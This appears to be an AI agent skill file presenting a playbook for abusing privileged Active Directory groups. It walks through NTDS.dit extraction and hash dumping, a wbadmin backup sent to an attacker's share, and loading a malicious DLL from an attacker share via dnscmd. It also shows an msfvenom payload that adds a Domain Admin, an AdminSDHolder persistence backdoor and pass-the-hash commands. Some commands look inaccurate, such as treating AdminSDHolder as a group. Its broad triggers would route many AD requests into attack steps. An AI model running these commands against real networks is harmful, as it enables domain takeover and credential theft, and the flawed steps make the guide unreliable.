---
name: ad-privileged-groups
description: Active Directory privileged group enumeration and exploitation. Use this skill whenever the user mentions Active Directory groups, privilege escalation, AD security assessment, domain enumeration, or needs to identify and exploit privileged group memberships. This includes scenarios involving Backup Operators, DnsAdmins, Print Operators, Server Operators, Account Operators, and other AD privileged groups. Make sure to use this skill for any AD security testing, penetration testing, or red teaming task involving group-based privilege escalation.
---

# Active Directory Privileged Groups

A comprehensive guide for enumerating and exploiting privileged Active Directory groups during security assessments.

## When to Use This Skill

Use this skill when:
- Enumerating Active Directory privileged groups
- Assessing privilege escalation paths via group membership
- Testing AD security configurations
- Red teaming Active Directory environments
- Investigating compromised accounts with group-based privileges

## Core Privileged Groups

### High-Privilege Administrative Groups

| Group | Privileges | Risk Level |
|-------|------------|------------|
| **Domain Admins** | Full domain control | Critical |
| **Enterprise Admins** | Full forest control | Critical |
| **Administrators** | Local admin on all domain-joined machines | Critical |

### Account Operators

Can create accounts and groups (non-admin), local DC login.

**Enumeration:**
```powershell
Get-NetGroupMember -Identity "Account Operators" -Recurse
```

### AdminSDHolder

Controls ACLs for all protected groups. Compromise grants persistent domain admin access.

**Enumeration:**
```powershell
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
```

**ACL Inspection:**
```powershell
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | Where-Object {$_.IdentityReference -match 'target-user'}
```

**Attack Vector:** Modify AdminSDHolder ACL to grant full permissions to a standard user. Changes propagate within 1 hour.

### Backup Operators

Has `SeBackupPrivilege` and `SeRestorePrivilege` - can read any file including NTDS.dit.

**Enumeration:**
```powershell
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```

**Key Capabilities:**
- Read any file on the system
- Access NTDS.dit for hash extraction
- Bypass file permissions via `FILE_FLAG_BACKUP_SEMANTICS`

### DnsAdmins

Can load arbitrary DLLs with SYSTEM privileges on DNS servers (often DCs).

**Enumeration:**
```powershell
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```

**Attack Vectors:**
1. **CVE-2021-40469**: Load malicious DLL via `dnscmd`
2. **WPAD MitM**: Create WPAD records for credential capture
3. **Mimilib.dll**: Execute commands via DNS service

### Print Operators

Has `SeLoadDriverPrivilege` - can load kernel drivers for SYSTEM access.

**Enumeration:**
```powershell
Get-NetGroupMember -Identity "Print Operators" -Recurse
```

### Server Operators

Can backup/restore, change system time, shutdown DCs.

**Enumeration:**
```powershell
Get-NetGroupMember -Identity "Server Operators" -Recurse
```

### Other Notable Groups

| Group | Key Privilege |
|-------|---------------|
| **Event Log Readers** | Access security logs |
| **Exchange Windows Permissions** | DCSync potential |
| **Hyper-V Administrators** | Full VM control |
| **Remote Desktop Users** | RDP access |
| **Remote Management Users** | WinRM access |
| **Organization Management** | Exchange mailbox access |

## Enumeration Workflow

### Step 1: Identify Current User's Groups

```powershell
# Using PowerView
Get-NetGroupMember -Identity "<group-name>" -Recurse

# Using native cmdlets
Get-ADPrincipalGroupMembership <username> | Select-Object Name
```

### Step 2: Check for Privileged Group Membership

Run the enumeration script for each target group:

```bash
# See scripts/enumerate-groups.ps1 for automated enumeration
```

### Step 3: Assess Exploitation Paths

Based on group membership, determine available attack vectors:

| Group | Primary Exploitation |
|-------|---------------------|
| Backup Operators | NTDS.dit extraction |
| DnsAdmins | DLL loading, WPAD MitM |
| Print Operators | Driver loading |
| Server Operators | Service manipulation |
| Account Operators | Account creation |

## NTDS.dit Extraction (Backup Operators)

### Method 1: diskshadow.exe

```powershell
# Create shadow copy
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit

# Copy NTDS.dit
robocopy /B F:\Windows\NTDS .\ntds ntds.dit

# Extract registry hives
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV

# Extract hashes
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```

### Method 2: wbadmin.exe

```powershell
# Backup to remote share
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds

# List versions
wbadmin get versions

# Recover NTDS.dit
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

## DnsAdmins Exploitation

### DLL Loading (CVE-2021-40469)

```powershell
# Install DNS tools if needed
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools

# Load local DLL
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\malicious.dll

# Load remote DLL
dnscmd [dc.computername] /config /serverlevelplugindll \\\<attacker>\share\malicious.dll

# Restart DNS service
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```

### Generate Payload DLL

```bash
# Using msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```

## Post-Exploitation

### Pass-the-Hash

```bash
# WinRM
netexec winrm <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# SMB
netexec smb <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```

## Scripts

Use the bundled scripts for common tasks:

- `scripts/enumerate-groups.ps1` - Enumerate all privileged groups
- `scripts/ntds-extract.ps1` - NTDS.dit extraction helper
- `scripts/dnsadmin-exploit.ps1` - DnsAdmins exploitation

## References

- [ired.team - Privileged Accounts](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [ired.team - AdminSDHolder](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)
- [Tarlogic - SeLoadDriverPrivilege](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [Microsoft - Privileged Groups](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)

## Safety Notes

- Only use these techniques in authorized security assessments
- Document all findings and remediation recommendations
- Some techniques may trigger security alerts
- Always have proper authorization before testing
